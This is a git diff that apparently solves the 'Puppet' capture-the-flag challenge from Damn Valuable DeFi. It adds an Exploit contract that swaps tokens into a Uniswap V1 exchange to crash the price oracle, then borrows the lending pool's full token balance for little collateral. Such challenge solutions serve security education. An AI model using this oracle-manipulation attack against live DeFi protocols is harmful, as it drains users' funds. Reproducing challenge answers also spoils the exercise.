@@ -92,7 +92,14 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        Exploit exploit = new Exploit{value:PLAYER_INITIAL_ETH_BALANCE}(
+            token,
+            lendingPool,
+            uniswapV1Exchange,
+            recovery
+        );
+        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
+        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
     }
 
     // Utility function to calculate Uniswap prices
@@ -114,5 +121,37 @@ contract PuppetChallenge is Test {
         // All tokens of the lending pool were deposited into the recovery account
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract Exploit {
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address recovery;
+    constructor(
+        DamnValuableToken _token,
+        PuppetPool _lendingPool,
+        IUniswapV1Exchange _uniswapV1Exchange,
+        address _recovery 
+    ) payable {
+        token = _token;
+        lendingPool = _lendingPool;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        recovery = _recovery;
+    }
+    function attack(uint exploitAmount) public {
+        uint tokenBalance = token.balanceOf(address(this));
+        token.approve(address(uniswapV1Exchange), tokenBalance);
+        console.log("before calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
+        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
+        console.log(token.balanceOf(address(uniswapV1Exchange)));
+        console.log("after calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
+        lendingPool.borrow{value: 20e18}(
+            exploitAmount,
+            recovery
+        );
+    }
+    receive() external payable {
     }
 }
